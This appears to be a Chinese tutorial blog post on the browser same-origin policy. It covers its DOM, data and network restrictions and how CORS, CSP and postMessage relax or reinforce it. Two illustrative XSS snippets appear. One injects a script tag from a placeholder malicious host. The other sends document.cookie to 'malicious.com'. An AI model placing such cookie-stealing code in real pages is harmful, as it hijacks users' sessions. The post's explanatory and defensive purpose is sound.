---
title: 浏览器安全——同源策略
date: 2019-12-23 17:25:09
tags: [JS, 浏览器工作原理与实践]
categories: 
 - 前端
 - JS
---

# 什么是同源策略
要了解什么是同源策略，我们得先来看看什么是同源。

如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名`www.baidu.com`，以及相同的端口 443，所以我们就说这两个 URL 是同源的。
```
https://www.baidu.com/?category=1
https://www.baidu.com/?category=0
```
浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。

具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。
## 第一个，DOM 层面
同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。

打开第一个网页，然后再从第一个网页中打开另外一个页面。由于第一个页面和第二个页面是同源关系，所以我们可以在第二个页面中操作第一个页面的 DOM，比如将第一个页面全部隐藏掉，代码如下所示：
```js
{
  let pdom = opener.document
  pdom.body.style.display = "none"
}
```
该代码中，对象`opener`就是指向第一个页面的`window`对象，我们可以通过操作`opener`来控制第一个页面中的 DOM。

我们在第二个页面的控制台中执行上面那段代码，就成功地操作了第一个页面中的 DOM，将页面隐藏了。

不过如果打开的第二个页面和第一个页面不是同源的，那么它们就无法相互操作 DOM 了。
## 第二个，数据层面
同源策略限制了不同源的站点读取当前站点的`Cookie、IndexDB、LocalStorage`等数据。由于同源策略，我们依然无法通过第二个页面的`opener`来访问第一个页面中的`Cookie、IndexDB`或者`LocalStorage`等内容。
## 第三个，网络层面
同源策略限制了通过`XMLHttpRequest`等方式将站点的数据发送给不同源的站点。
# 安全和便利性的权衡
我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。

不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击。
## 1. 页面中可以嵌入第三方资源
Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。

所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。

比如，恶意程序在 HTML 文件内容中插入一段 JavaScript 代码：
```html
<script src="http://xxx.com/malicious.js"></script>
```

当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。

除此之外，它还能将页面的的敏感数据，如`Cookie、IndexDB、LoacalStorage`等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：
```js
function onClick(){
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()
```
在这段代码中，恶意脚本读取`Cookie`数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的`Cookie`信息。

以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。
## 2. 跨域资源共享和跨文档消息机制
默认情况下，如果打开第一个页面，在第一个页面中通过`XMLHttpRequest`或者`Fetch`来请求第二个页面中的资源，这时同源策略会阻止其向第二个页面发出请求，这样会大大制约我们的生产力。

为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。

如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过`window.postMessage`的 JavaScript 接口来和不同源的 DOM 进行通信。
# 总结
同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。

不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：
* 页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。
* 使用`XMLHttpRequest`和`Fetch`都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。
* 两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。